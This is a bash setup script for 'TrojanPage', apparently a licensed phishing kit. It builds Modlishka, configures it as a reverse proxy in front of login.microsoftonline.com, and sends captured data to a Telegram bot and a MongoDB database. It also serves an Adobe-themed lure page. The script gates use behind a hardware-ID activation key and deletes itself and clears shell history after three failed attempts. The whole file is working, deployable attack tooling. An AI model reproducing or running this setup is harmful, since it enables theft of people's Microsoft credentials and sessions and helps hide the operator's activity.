#!/bin/bash
# 🏛️ TROJANPAGE - THE ULTIMATE GATEKEEPER (GLOBAL EDITION)
# --------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

# --- 1. THE TROJANPAGE HEADER FUNCTION ---
show_header() {
    clear
    echo -e "${BLUE}"
    echo "  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
    echo -e "${NC}"
    echo -e "${RED}                  [ SYSTEM ACCESS CONTROL ]${NC}"
    echo " ----------------------------------------------------------------------------------"
}

# --- 2. HWID & SECURITY LOGIC ---
HWID=$(hostnamectl | grep "Static hostname" | awk '{print $3}')-$(lscpu | grep "Model" | md5sum | cut -c1-8 | tr '[:lower:]' '[:upper:]')
SECRET_SALT="MY_PRIVATE_PHRASE_2026" # <--- Change this to your secret salt
VALID_KEY=$(echo -n "${HWID}${SECRET_SALT}" | md5sum | cut -c1-10 | tr '[:lower:]' '[:upper:]')

# --- 3. THE 3-STRIKE SENTRY ---
ATTEMPTS=0
while [ $ATTEMPTS -lt 3 ]; do
    show_header
    echo -e "${GREEN}[+] SYSTEM HWID:${NC} $HWID"
    echo -e "${BLUE}[!] Send HWID to @YourUsername on TG for activation.${NC}"
    echo " ----------------------------------------------------------------------------------"
    
    if [ $ATTEMPTS -gt 0 ]; then
        echo -e "${RED}[warning] Attempt $((ATTEMPTS)) of 3 failed. Self-destruct in $((3 - ATTEMPTS)) strikes.${NC}"
    fi

    read -p "ENTER ACTIVATION KEY: " USER_KEY

    if [ "$USER_KEY" == "$VALID_KEY" ]; then
        echo -e "${GREEN}[success] Activation Successful. Initializing...${NC}"
        sleep 1
        break
    else
        ATTEMPTS=$((ATTEMPTS + 1))
        sleep 1
    fi

    if [ $ATTEMPTS -eq 3 ]; then
        echo -e "${RED}[critical] Brute-force detected. Self-destructing...${NC}"
        rm -- "$0"
        history -c
        clear
        exit 1
    fi
done

# --- 4. VERIFIED SETUP WIZARD ---
echo -e "\n${BLUE}--- CONFIGURATION SETUP (VERIFIED) ---${NC}"
sudo apt update && sudo apt install -y curl mongodb-clients golang-go git make screen php-cli unzip > /dev/null 2>&1

# TELEGRAM CHECK
while true; do
    read -p "Enter Telegram Bot Token: " TG_TOKEN
    if curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe" | grep -q "\"ok\":true"; then
        echo -e "${GREEN}[+] Token Valid${NC}"; break
    else
        echo -e "${RED}[!] Invalid Token. Try again.${NC}"
    fi
done
read -p "Enter Telegram Chat ID: " TG_ID

# CLOUDFLARE CHECK
while true; do
    read -p "Enter Cloudflare API Token: " CF_TOKEN
    if curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" -H "Authorization: Bearer $CF_TOKEN" | grep -q "\"status\":\"active\""; then
        echo -e "${GREEN}[+] Token Valid${NC}"; break
    else
        echo -e "${RED}[!] Invalid Token. Try again.${NC}"
    fi
done

# MONGODB ATLAS CHECK
while true; do
    read -p "Enter MongoDB Host (e.g. cluster0.abc.mongodb.net): " M_HOST
    read -p "Enter MongoDB User: " M_USER
    read -p "Enter MongoDB Pass: " M_PASS
    if mongosh "mongodb+srv://$M_USER:$M_PASS@$M_HOST/admin" --eval "db.adminCommand('listDatabases')" > /dev/null 2>&1; then
        echo -e "${GREEN}[+] Connection Successful${NC}"; break
    else
        echo -e "${RED}[!] Connection Failed. Check credentials.${NC}"
    fi
done

read -p "Enter Your Domain: " USER_DOMAIN

# --- 5. ENGINE DEPLOYMENT ---
echo -e "${BLUE}[+] Compiling Trojan Engine...${NC}"
cd /root
if [ ! -d "engine" ]; then
    git clone https://github.com/drk1wi/Modlishka.git engine > /dev/null 2>&1
    cd engine && make > /dev/null 2>&1 && cd ..
fi

cat << EOF > /root/config.json
{
  "proxyDomain": "$USER_DOMAIN",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "target": "login.microsoftonline.com",
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "mongodb": "mongodb+srv://$M_USER:$M_PASS@$M_HOST/trojan_db?retryWrites=true&w=majority"
}
EOF

# --- 6. CREATE THE PERMANENT RUN SCRIPT ---
cat << 'EOF' > /root/run.sh
#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

LICENSE_FILE="/root/.license"
CURRENT_DATE=$(date +%s)
HWID=$(hostnamectl | grep "Static hostname" | awk '{print $3}')-$(lscpu | grep "Model" | md5sum | cut -c1-8 | tr '[:lower:]' '[:upper:]')

clear
echo -e "${BLUE}"
echo "  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
echo "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
echo "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
echo "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
echo "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
echo "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
echo -e "${NC}"
echo -e "${RED}                  [ SYSTEM ACCESS CONTROL ]${NC}"
echo " ----------------------------------------------------------------------------------"

if [ -f "$LICENSE_FILE" ]; then
    EXPIRY_DATE=$(cat "$LICENSE_FILE" | cut -d':' -f2)
    if [ "$CURRENT_DATE" -lt "$EXPIRY_DATE" ]; then
        DAYS_LEFT=$(( ($EXPIRY_DATE - $CURRENT_DATE) / 86400 ))
        echo -e "${GREEN}[success] License Active ($DAYS_LEFT Days Remaining).${NC}"
        sudo fuser -k 80/tcp 443/tcp 2>/dev/null
        pkill proxy && pkill php
        screen -dmS lure php -S 0.0.0.0:80 -t /var/www/adobe_gui/
        screen -dmS trojan /root/engine/dist/proxy -config /root/config.json
        echo -e "${BLUE}[!] Trojan Engine is now LIVE in the background.${NC}"
        exit 0
    fi
fi
echo -e "${RED}[error] Hardware ID $HWID is not registered.${NC}"
exit 1
EOF
chmod +x /root/run.sh

# --- 7. PERMANENT GLOBAL COMMANDS ---
sudo ln -sf /root/run.sh /usr/local/bin/Run
sudo ln -sf /root/run.sh /usr/local/bin/run
echo "alias logs='tail -f /root/engine/logs/proxy.log'" >> ~/.bashrc

# Set initial license to 90 days after successful wizard
EXPIRY=$(($(date +%s) + 7776000))
echo "$HWID:$EXPIRY" > /root/.license

echo -e "${GREEN}[success] Setup Complete!${NC}"
echo -e "${BLUE}[!] Just type 'Run' to start the TrojanPage interface.${NC}"
